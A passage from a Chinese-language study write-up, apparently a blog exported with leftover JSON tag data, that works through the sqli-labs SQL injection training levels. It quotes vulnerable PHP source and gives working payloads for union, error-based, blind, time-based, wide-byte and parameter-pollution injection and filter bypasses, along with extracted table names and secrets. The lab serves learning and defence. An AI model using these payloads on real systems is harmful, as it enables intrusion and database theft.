流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)<br><br>  修改Cookie为： uname=-1’ union select 1,(select version()),3 #<br><br>  返回 ：</p>\n<pre><code>Your Login name:5.7.23-0ubuntu0.16.04.1\nYour Password:3\nYour ID:1\n</code></pre><p>  也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br><br>   uname=admin’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# <br><br>  返回:Issue with your mysql: XPATH syntax error: ‘~/usr/~’</p>\n</li>\n<li><p><strong> less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String </strong> <br><br>  setcookie(‘uname’, base64_encode($row1[‘username’]), time()+3600);<br>  $sql=”SELECT * FROM users WHERE username=(‘$cookee’) LIMIT 0,1”;<br><br>  对Cookie 进行了 base64处理 <br><br>  uname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj<br>  uname=-1’) union select 1,(select version()),3 #<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>   Your Password:3<br><br>  Your ID:1</p>\n</li>\n<li><p><strong> less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String </strong> <br><br>  对Cookie进行了base64编码，使用的双引号</p>\n</li>\n</ul>\n<hr>\n<ul>\n<li><p><strong> less 23 GET - Error Based - Strip Comments </strong> <br><br>  php中处理：<br><br>  $reg = “/#/“;<br><br>  $reg1 = “/–/“;<br><br>  $replace = “”;<br><br>  $id = preg_replace($reg, $replace, $id); //将$reg替换为$replace<br><br>  $id = preg_replace($reg1, $replace, $id);<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等<br><br>  ?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:3</p>\n</li>\n<li><p><strong> less 24 POST - Second Order Injection *Real treat* - Stored Injections </strong> <br><br>  本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入<br><br>  php中:<br></p>\n<pre><code>$sql = &quot;select count(\\*) from users where username=&apos;$username&apos;&quot;;\n    $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);\n    $sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;;\n    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;\n</code></pre><p>  先注册一个admin’#用户，更改其密码，实际上是更改的admin的密码</p>\n</li>\n<li><p><strong>less 25 GET - Error Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong><br><br>  $id= preg_replace(‘/or/i’,””, $id);            //strip out OR (non case sensitive)<br><br>  $id= preg_replace(‘/AND/i’,””, $id);        //Strip out AND (non case sensitive)<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：使用union<br>  绕过过滤：</p>\n<pre><code>（1）大小写变形 Or,OR,oR\n（2）编码，hex，urlencode\n（3）添加注释/*or*/\n（4）利用符号 and=&amp;&amp; or=||\n</code></pre><p>  ?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23<br>  返回：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>\n</li>\n<li><p><strong>less 25a GET - Blind Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong> <br><br>  $id= blacklist($id);<br><br>  $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  //print_r(mysql_error()); <br><br>  报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤<br><br>  ?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)<br><br>然后依次这样，查出数据库名</p>\n</li>\n<li><p><strong>less 26 GETs - Error Based - All your Spaces and Comments Belong to us</strong> <br><br>  Comments 注释<br><br>  php中:<br></p>\n<pre><code>function blacklist($id)\n {\n $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)\n $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)\n $id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);        //strip out /*\n $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --\n $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #\n $id= preg_replace(&apos;/[\\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces\n $id= preg_replace(&apos;/[\\/\\\\\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes\n return $id;\n}\n</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：<br><br>注释过滤了可以手动闭合引号，空格过滤<br>  可以使用  %a0  换行，<br><br>/**/ 注释， （） 括号等绕过空格<br><br>  此处注释不能使用，为了使用select时去掉末尾引号，空格也不行<br><br>  id=’111’union(select(1),(version()),(3)） ‘ LIMIT 0,1; 使用括号时，引号还在<br><br>  ?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功</p>\n</li>\n<li><p><strong>less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis</strong> <br><br>  过滤和less26相同<br><br>  $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;<br><br>  ?id=111%27)union%a0select%a01%2cversion()%2c3||(%271<br></p>\n<p>  思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&amp;<br><br>  ?id=1%27%26%26%271=1 猜测为’ ‘<br><br>  ?id=1%27)%26%26(%271=1 猜测为（’ ‘）<br><br>  ?id=1%22%26%26%221=1 猜测为 “ “<br><br>  ?id=1%22)%26%26(%221=1 猜测为(“ “)<br><br>  ?id=1)%26%26(1=1  猜测为()<br><br>  ?id=1%26%261=1 无<br><br>等诸如此类<br></p>\n</li>\n<li><p><strong>less 27 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes</strong><br></p>\n<pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);        //strip out /*\n$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.\n$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union\n$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select\n$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION\n$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT\n$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union\n$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out select\nreturn $id;\n}\n</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br></p>\n<p>  思路一：大小写绕过<br><br>  ?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27<br><br>  思路二：报错或延时？</p>\n</li>\n<li><p><strong>less 27a GET - Blind Based - All your UNION &amp; SELECT Belong to us -Double Quotes</strong><br><br>  1.?id=1%22%26%26%221=1 成功，猜测为“ “过滤<br><br>  2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入<br></p>\n</li>\n<li><p><strong>less 28 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes with Parentesis</strong><br></p>\n<pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);                //strip out /*\n$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);                //Strip out --.\n$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);                    //Strip out #.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.\n$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);                    Strip out spaces.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.\n$id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.\nreturn $id;\n}\n $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;\n</code></pre><p>  ?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27</p>\n<ul>\n<li><strong>less 28a GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes - Parentesis</strong><br><pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;, $id);        //Strip out spaces.\nreturn $id;\n}\n$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;\n</code></pre>?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同</li>\n</ul>\n</li>\n<li><p><strong>less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application</strong><br><br>服务器（两层架构）<br><br>  当?id=1&amp;id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容<br><br>  此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 <br><br>  ?id=1&amp;id=-2%27union%20select%201,user(),version()%27<br><br>  返回:<br><br>Your Login name:root@localhost<br><br>  Your Password:5.7.23-0ubuntu0.16.04.1</p>\n</li>\n<li><p><strong>less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong><br><br>  ?id=1&amp;id=-2%22union%20select%201,user(),version()%22</p>\n</li>\n<li><p><strong>less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong> <br><br>  ?id=1&amp;id=-2”)union%20select%201,user(),version()%23</p>\n</li>\n<li><p><strong>less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars</strong><br><br>宽字节注入<br><br>  原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \\ 除掉。<br><br>一般有两种思路： <br><br>  1、%df 吃掉 \\ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。<br><br>  2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。<br></p>\n<p>  addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：’   “  \\<br><br>  addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行</p>\n<pre><code>function check_addslashes($string)\n{\n    $string= addslashes($string);    \n    return $string;\n}\n</code></pre><p>  例?id=-1%27%20union%20select%201,version(),user()%20%27<br><br>  The filtered request is :-1\\’ union select 1,version(),user() \\’<br></p>\n<p>  ?id=-1%df%27%20union%20select%201,version(),user()%23<br><br>  返回:<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:root@localhost</p>\n</li>\n<li><p><strong>less 33 GET -  Bypass AddSlashers()</strong><br><br>  ?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样</p>\n</li>\n<li><p><strong>less 34 POST - Bypass AddSlashers()</strong><br><br>  post型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为’ 。我们就 可以利用这个方式进行尝试。<br></p>\n<p>  運’ or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c <br><br>  SELECT username, password FROM users WHERE username=’運\\’ or 1=1# ‘ and password=’’ LIMIT 0,1</p>\n</li>\n<li><p><strong>less 35 GET - Bypass Add Slashes(we dont need them) Integer Based</strong><br><br>  php中：$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  可以看出，不需要构造特殊符号<br><br>  ?id=-1%20union%20select%201,version(),user()%23<br></p>\n</li>\n<li><p><strong>less 36 GET - Bypass mysql_real _escape _string</strong><br><br>  mysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符<br><br>  string 必需，要转义的字符串<br><br>  connection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接<br></p>\n<pre><code>\\x00  ascii码 null\n\\n    换行\n\\r    回车\n\\\n&apos;\n&quot;\n\\x1a （即十进制26）&amp;\n</code></pre><p>  这些字符会被转义<br></p>\n<pre><code>function check_quotes($string)\n{\n    $string= mysql_real_escape_string($string);    \n    return $string;\n}\n$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;\n</code></pre><p>  ?id=-1%df%27%20union%20select%201,version(),user()%23 成功</p>\n</li>\n<li><p><strong>less 37 POST - Bypass mysql_real_escape_string</strong> <br><br>  運’ or 1=1 #</p>\n</li>\n</ul>\n<hr>\n<p>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 <br><br>原理:<br><br>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 <br><br>局限:<br><br>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 <br><br>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。<br>因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息<br></p>\n<p>暂不深入了解</p>\n<hr>\n<p>challenge</p>\n<ul>\n<li><p><strong>GET - challenge - Union -10 Queries Allowed - Variation1</strong><br><br>  1.查表名<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  得到此次的表名: 8TELU525VO<br><br>  2.查列名 用concat一次性查完输出<br><br>  ?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23<br><br>  返回:<br><br>Your Login name:id—,sessid—,secret_63JY—,tryy—<br><br>  Your Password:3<br><br>  3.得到密码id,sessid,secret_63JY<br><br>  ?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23<br><br>  返回:<br><br>Your Login name:856213ca887976a33e3d91b2c61fa65a<br><br>  Your Password:M5ztHsC34iN2X0lzCiXJ27Cp<br><br>  4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成</p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 2</strong><br><br>  1.猜测过滤规则<br><br>  当输入?id=1)%26%26(1=1 时 成功 可知过滤为()<br><br>  2.参考less 54<br><br>  ?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  表名为: C73JPUKYS9    <br><br>  ?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d<br>  %22C73JPUKYS9%22),3%20%23<br><br>  列名: Your Login name:id—,sessid—,secret_DH0J—,tryy—<br><br>  ?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23<br><br>  密码：<br><br>Your Login name: 4d0218b33a232f675d53381ef38b5370<br><br>Your Password: kjbKG19I62vmYE3kS7gGN7qf <br> 成功</p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 3</strong><br><br>  1.猜测<br><br>  ?id=1%27)%26%26(%271=1 成功 可知为(‘ ‘)<br><br>  2.下面步骤如上<br></p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 4</strong><br><br>  如上</p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 1</strong><br><br>  1.猜测<br><br>  ?id=1%27%26%26%271=1 成功，可知为’ ‘<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 <br>  返回同上，可知有其它过滤规则<br><br>  尝试报错注入<br><br>  ?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()<br><br>  2.获取表名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23<br><br>  返回：XPATH syntax error: ‘~4HT916R6T1~’<br><br>  3.获取列名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,”—“)%20from%20information_schema.columns%20where%20table_name%3d%20”4HT916R6T1”),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~id—,sessid—,secret_EN0R—,’为什么有一个列没显示<br><br>  4.获取密码<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~OcDGOovBkd3XMq3FpuSNtEIN~’<br></p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 2</strong><br><br>  ?id=1%26%261=1 返回成功，说明无字符<br><br>  剩余步骤如 less 58<br></p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 3</strong><br> ?id=1%22%26%26%221=1 猜测为 “ “<br><br>?id=1%22)%26%26(%221=1 猜测为(“ “) <br><br>都返回相同结果？？？？<br><br>但实际上</p>\n<pre><code>$id = &apos;(&quot;&apos;.$id.&apos;&quot;)&apos;;\n  $sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;\n     if($row)\n      {\n          echo &apos;&lt;font color= &quot;#00FFFF&quot;&gt;&apos;;\n          $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);\n          $pass = array_reverse($unames);\n          echo &apos;Your Login name : &apos;. $unames[$row[&apos;id&apos;]];\n          echo &quot;&lt;br&gt;&quot;;\n          echo &apos;Your Password : &apos; .$pass[$row[&apos;id&apos;]];\n          echo &quot;&lt;/font&gt;&quot;;\n      }\n      else\n      {\n          echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;\n          print_r(mysql_error());\n          echo &quot;&lt;/font&gt;&quot;;  \n      }\n</code></pre><p> 每次返回都是$unames=array（），奸诈！！</p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 4</strong><br><br>  $sql=”SELECT * FROM security.users WHERE id=((‘$id’)) LIMIT 0,1”;</p>\n</li>\n<li><p><strong>GET - Challenge - Blind -130 Queries Allowed - Variation 1</strong><br><br>  盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率<br><br>  ?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))–+</p>\n</li>\n</ul>\n<h3 id=\"三-杂记\"><a href=\"#三-杂记\" class=\"headerlink\" title=\"三.杂记\"></a>三.杂记</h3><ul>\n<li><p>盲注<br><br>  语句执行完后没有回显<br><br>  1.基于布尔<br><br>  构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）<br><br>  2.基于报错<br><br>  SELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2));<br><br>  [Err] 1062 - Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘&lt;group_key&gt;’<br><br>  具体原理不懂，concat, floor, group by，rand(0)是关键<br><br>  如果rand被禁用可以使用用户变量来报错？？<br><br>  或者XPath报错等<br><br>  3.基于时间-延迟注入<br><br>  利用if,当条件正确或错误时，确定要不要sleep()来猜测<br></p>\n</li>\n<li><p>insert/update/delete注入<br><br>  思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br></p>\n</li>\n<li><p>order by<br><br>可以用来确定有几列，如 order by 4 ,报错没有第四列<br></p>\n</li>\n<li><p>url编码</p>\n<pre><code>空格    -    %20\n&quot;          -    %22\n#         -    %23\n%        -    %25\n&amp;         -    %26\n(          -    %28\n)          -    %29\n+         -    %2B\n,          -    %2C 逗号\n/          -    %2F\n:          -    %3A\n;          -    %3B\n&lt;         -    %3C\n=         -    %3D\n&gt;         -    %3E\n?         -    %3F\n@       -    %40\n\\          -    %5C\n|          -    %7C\n&apos;               %27  单引号\n</code></pre></li>\n<li><p>补充一些数据库知识<br></p>\n<pre><code>infomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。\n如数据库名，数据库的表，表栏的数据类型与访问权限等。&lt;/br&gt;\n再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，\n每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。&lt;/br&gt;\n\ninformation_schema的表schemata中的列schema_name记录了所有数据库的名字\ninformation_schema的表tables中的列table_schema记录了所有数据库的名字\ninformation_schema的表tables中的列table_name记录了所有数据库的表的名字\ninformation_schema的表columns中的列table_schema记录了所有数据库的名字\ninformation_schema的表columns中的列table_name记录了所有数据库的表的名字\ninformation_schema的表columns中的列column_name记录了所有数据库的表的列的名字\n</code></pre><p>查询指定数据库所有表名<br><br>SELECT table_name FROM information_schema.tables WHERE table_schema=’数据库名’;<br><br>查询mysql中所有数据库名字<br><br>SELECT schema_name FROM information_schema.schemata<br></p>\n<p>  version()  mysql版本<br>  user()用户<br>  @@datadir数据路径<br>  @@version_compile_os 操作系统<br>  database() 数据库名字<br>  SELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();<br>–+/# 注释，一般用#，url编码为%23<br><br><br>mysql中XPath:<br><br>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()<br><br>ExtractValue():<br><br>  EXTRACTVALUE (XML_document, XPath_string); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  作用：从目标XML中返回包含所查询值的字符串<br><br>UpdateXml():<br><br>  UPDATEXML (XML_document, XPath_string, new_value); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  第三个参数：new_value，String格式，替换查找到的符合条件的数据 <br><br>  作用：改变文档中符合条件的节点的值 <br><br>通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br><br>0x7E为~的ascii码<br><br><br>if<br><br>IF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3<br><br><br>concat() 连接字符串，将多个连接在一起。<br><br>  concat(str1,str2,…)<br><br>concat_ws() 将多个字符串连接在一起，可以一次性指定分隔符<br><br>  concat_ws(sparator, str1,str2,…)<br><br>group_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果<br><br>  group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )<br></p>\n</li>\n</ul>\n<ul>\n<li><p>问题：<br><br>1.怎么确定是哪种注入类型？<br><br>2.在没有返回值的情况下判断单引号双引号括号等</p>\n</li>\n<li><p>其它</p>\n<pre><code>?id=1%27%26%26%271=1 猜测为’ ‘\n?id=1%27)%26%26(%271=1 猜测为（’ ‘）\n?id=1%22%26%26%221=1 猜测为 &quot; &quot;\n?id=1%22)%26%26(%221=1 猜测为(&quot; &quot;)\n?id=1)%26%26(1=1  猜测为()\n?id=1%26%261=1 无\n</code></pre></li>\n</ul>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cjr6404ys00006cvpxid54wwf","tag_id":"cjr6404ze00026cvpftouqvnh","_id":"cjr6404zl00076cvprm03whka"},{"post_id":"cjr6404zb00016cvpn74dey4w","tag_id":"cjr6404zk00066cvpd4139ffr","_id":"cjr6404zr000b6cvpoi1et1kn"},{"post_id":"cjr6404zi00046cvpht1la5ju","tag_id":"cjr6404zq000a6cvpuxvjttls","_id":"cjr6404zs000d6cvp8w62bvqa"},{"post_id":"cjr6404zj00056cvpk8trhm0v","tag_id":"cjr6404zr000c6cvphfegl66o","_id":"cjr6404zu000g6cvp2s2mnpgf"},{"post_id":"cjr6404zj00056cvpk8trhm0v","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr6404zv000h6cvpukwieews"},{"post_id":"cjr6404zm00086cvptjcztt54","tag_id":"cjr6404zt000f6cvp1y3023em","_id":"cjr6404zv000i6cvp9dc82lfn"},{"post_id":"cjr64050c000j6cvphpv6unib","tag_id":"cjr64050e000k6cvpvxgivf79","_id":"cjr64050f000l6cvp30xfipon"},{"post_id":"cjr64051f000p6cvpfmamwljl","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64051i000r6cvpo42cfpws"},{"post_id":"cjr64051h000q6cvp19701ge8","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64051m000u6cvpfsbjfbgr"},{"post_id":"cjr64051a000m6cvpnkvgpwqk","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64051o000w6cvpxypav5v3"},{"post_id":"cjr64051a000m6cvpnkvgpwqk","tag_id":"cjr64051e000o6cvp8zvgasic","_id":"cjr64051q000y6cvpzjb7mmne"},{"post_id":"cjr64051i000s6cvpo61fq66y","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64051s00106cvpuwzk4o1f"},{"post_id":"cjr64051n000v6cvprps6yxkg","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64051u00126cvp2if3v3h0"},{"post_id":"cjr64051c000n6cvpirezjyn9","tag_id":"cjr64051e000o6cvp8zvgasic","_id":"cjr64051w00146cvpv94kzd9h"},{"post_id":"cjr64051c000n6cvpirezjyn9","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64051y00176cvpvzbtvpe1"},{"post_id":"cjr64051o000x6cvpu0o76r0m","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64052000196cvpak13i4u2"},{"post_id":"cjr64051q000z6cvp12u4jowo","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr640522001b6cvp0o1rhlc2"},{"post_id":"cjr64051s00116cvpkrkkf5uo","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr640524001e6cvp760jg7pg"},{"post_id":"cjr64051w00156cvpjarj1vvp","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr640526001g6cvpxybyvz39"},{"post_id":"cjr64051w00156cvpjarj1vvp","tag_id":"cjr64051e000o6cvp8zvgasic","_id":"cjr640527001i6cvpfhb2rl90"},{"post_id":"cjr640521001a6cvpkang5ng4","tag_id":"cjr64051y00166cvp305u96fe","_id":"cjr64052a001l6cvpmy9efh0a"},{"post_id":"cjr640521001a6cvpkang5ng4","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64052c001n6cvp0q7zdgri"},{"post_id":"cjr64051u00136cvphm6eaktu","tag_id":"cjr64051e000o6cvp8zvgasic","_id":"cjr64052e001p6cvp7qstl5ea"},{"post_id":"cjr64051u00136cvphm6eaktu","tag_id":"cjr64051y0016